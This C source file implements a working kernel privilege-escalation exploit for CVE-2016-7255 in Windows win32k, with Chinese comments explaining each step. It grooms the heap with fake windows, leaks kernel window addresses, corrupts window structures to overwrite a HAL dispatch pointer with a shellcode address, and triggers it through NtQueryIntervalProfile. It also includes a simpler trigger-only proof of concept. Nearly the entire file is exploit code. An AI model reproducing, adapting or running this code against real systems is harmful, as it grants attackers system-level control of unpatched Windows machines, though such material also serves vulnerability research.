#include "CVE-2016-7255.h"

BOOL Exploit_CVE_2016_7255()
{
	BOOL bRet = TRUE;
	HWND hFakeWnd[105] = { 0 };
	DWORD i = 0;
	
	if (!Init_CVE_2016_7255(hFakeWnd))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2016_7255(hFakeWnd))
	{
		bRet = FALSE;
		goto exit;
	}

	for (i = 0; i < 100; i++)
	{
		if (hFakeWnd[i])
		{
			DestroyWindow(hFakeWnd[i]);
			hFakeWnd[i] = NULL;
		}
	}
exit:
	return bRet;
}

BOOL Trigger_CVE_2016_7255(HWND *hWndList)
{
	BOOL bRet = TRUE;
	HWND hTriggerWnd = NULL, hAttackWnd = NULL, hDesktop = NULL;
	WNDCLASSEX wc = { 0 };
	char *pClassName = "Trigger";
	DWORD i = 0;

	// 获取父窗口
	hDesktop = GetDesktopWindow();
	if (!hDesktop)
	{
		bRet = FALSE;
		ShowError("GetDesktopWindow", GetLastError());
		goto exit;
	}

	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pClassName;

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	// 创建触发漏洞的窗口
	hTriggerWnd = CreateWindowEx(NULL,
							     pClassName,
							     NULL,
							     WS_VISIBLE,
							     0, 0, 100, 100,
							     hDesktop,			// 指定父窗口为桌面窗口
							     0,
							     GetModuleHandle(NULL),
							     0);
	if (!hTriggerWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	DWORD dwTriggerAddr = 0, dwAttackAddr = 0;
	lHMValidateHandle HMValidateHandle =  (lHMValidateHandle)GetHMValidateHandle();

	PTHRDESKHEAD pTriggerHead = (PTHRDESKHEAD)HMValidateHandle(hTriggerWnd, TYPE_WINDOW);

	dwTriggerAddr = (DWORD)pTriggerHead->pSelf;
	// 寻找用来攻击的tagWND
	for (i = 0; i < 100; i++)
	{
		if (hWndList[i])
		{
			PTHRDESKHEAD pFakeHead = (PTHRDESKHEAD)HMValidateHandle(hWndList[i], TYPE_WINDOW);

			dwAttackAddr = (DWORD)pFakeHead->pSelf;
			if (dwAttackAddr > dwTriggerAddr && dwAttackAddr - dwTriggerAddr < 0x3FD000)
			{
				hAttackWnd = hWndList[i];
				break;
			}
		}
	}

	if (!hAttackWnd)
	{
		printf("Do not find Attack tagWND\n");
		bRet = FALSE;
		goto exit;
	}

	// 设置子窗口带WS_CHILD标记
	// 这样GetNonChildAncesstor就会返回其父窗口，即hDesktop
	SetWindowLong(hTriggerWnd, GWL_STYLE, (WS_VISIBLE | WS_CHILD));

	CONST DWORD dwCbExOffset = 0x90;
	DWORD dwValue = 0;

	dwValue = dwTriggerAddr + dwCbExOffset + 3 - 0x14;
	// 设置子窗口的spwnd为cbwndExtra + 3的位置
	SetWindowLong(hTriggerWnd, GWL_ID, dwValue);

	// 将桌面窗口，也就是父窗口置于最前面
	// 模拟Alt + Esc按键触发漏洞
	SwitchToThisWindow(hDesktop, TRUE);
	keybd_event(VK_MENU, 0, 0, 0);
	keybd_event(VK_ESCAPE, 0, 0, 0);

	if (!EnablePrivilege_CVE_2016_7255(hTriggerWnd, hAttackWnd, dwAttackAddr - dwTriggerAddr - 0xB0))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	if (hTriggerWnd)
	{
		if (!DestroyWindow(hTriggerWnd))
		{
			bRet = FALSE;
		}
	}
	return bRet;
}

BOOL EnablePrivilege_CVE_2016_7255(HWND hTriggerWnd, HWND hAttackWnd, DWORD dwOffset)
{
	BOOL bRet = TRUE;
	
	PVOID pTargetAddr = NULL;
	// 获取目标函数地址
	pTargetAddr = GetHalQuerySystemInformation();

	if (!pTargetAddr)
	{
		bRet = FALSE;
		goto exit;
	}

	DWORD dwOrg = 0, dwOrgPar = 0;
	DWORD dwParentOffset = dwOffset + 0x34;

	// 获取原tagWND->spwndParent
	dwOrgPar = GetWindowLong(hTriggerWnd, dwParentOffset);
	
	// 设置tagWND->spwndParent为目标函数地址
	SetWindowLong(hTriggerWnd, dwParentOffset, (ULONG)pTargetAddr);

	// 获取目标函数地址中的原来的内容
	dwOrg = (DWORD)GetAncestor(hAttackWnd, GA_PARENT);

	// 恢复tagWND->spwndParent
	SetWindowLong(hTriggerWnd, dwParentOffset, dwOrgPar);

	DWORD dwBufOffset = dwOffset + 0x84 + 0x8;
	 
	// 修改tagWND->StrName->Buffer为目标函数地址
	SetWindowLong(hTriggerWnd, dwBufOffset, (ULONG)pTargetAddr);
	
	// 设置目标函数地址为ShellCode地址
	WCHAR wBuf[3] = { 0 };

	*(PDWORD)wBuf = (DWORD)ShellCode;
	if (!SetWindowTextW(hAttackWnd, wBuf))
	{
		ShowError("SetWindowText", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 调用函数实现提权
	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}

	// 恢复目标函数地址
	*(PDWORD)wBuf = dwOrg;
	if (!SetWindowTextW(hAttackWnd, wBuf))
	{
		ShowError("SetWindowText", GetLastError());
		bRet = FALSE;
		goto exit;
	}
	
exit:
	return bRet;
}

BOOL Init_CVE_2016_7255(HWND *hWndList)
{
	BOOL bRet = TRUE;
	CONST DWORD dwFakeNum = 100;
	WNDCLASSEX wc = { 0 };
	char *pFakeName = "Fake";
	DWORD i = 0;
	
	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pFakeName;

	if (!RegisterClassEx(&wc))
	{
		ShowError("RegisterClassEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 创建用来攻击的窗口
	for (i = 0; i < dwFakeNum; i++)
	{
		hWndList[i] = CreateWindowEx(NULL,
									 pFakeName,
									 "Hack",
									 WS_VISIBLE,
									 0, 0, 100, 100,
									 NULL,
									 0,
									 GetModuleHandle(NULL),
									 0);
		if (!hWndList[i])
		{
			ShowError("CreateWindowEx", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 释放其中的一部分用来保存触发漏洞时候创建的窗口
	for (i = 20; i < 80; i += 2)
	{
		if (!DestroyWindow(hWndList[i]))
		{
			ShowError("DestroyWindow", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hWndList[i] = NULL;
	}
	
exit:
	return bRet;
}

BOOL POC_CVE_2016_7255()
{
	BOOL bRet = TRUE;
	HWND hwnd = NULL, hDesktop = NULL;
	WNDCLASSEX wc = { 0 };
	char *pClassName = "POC";

	// 获取父窗口
	hDesktop = GetDesktopWindow();
	if (!hDesktop)
	{
		bRet = FALSE;
		ShowError("GetDesktopWindow", GetLastError());
		goto exit;
	}

	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pClassName;

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	// 创建触发漏洞的窗口
	hwnd = CreateWindowEx(NULL, 
						  pClassName,
						  NULL,
						  WS_VISIBLE,
						  0, 0, 100, 100, 
						  hDesktop,			// 指定父窗口为桌面窗口
						  0,
						  GetModuleHandle(NULL),
						  0);
	if (!hwnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	// 设置子窗口带WS_CHILD标记
	// 这样GetNonChildAncesstor就会返回其父窗口，即hDesktop
	SetWindowLong(hwnd, GWL_STYLE, (WS_VISIBLE | WS_CHILD));

	// 设置子窗口的spwnd
	SetWindowLong(hwnd, GWL_ID, 0x1900);

	// 将桌面窗口，也就是父窗口置于最前面
	// 模拟Alt + Esc按键触发漏洞
	SwitchToThisWindow(hDesktop, TRUE);
	keybd_event(VK_MENU, 0, 0, 0);
	keybd_event(VK_ESCAPE, 0, 0, 0);

exit:
	return bRet;
}
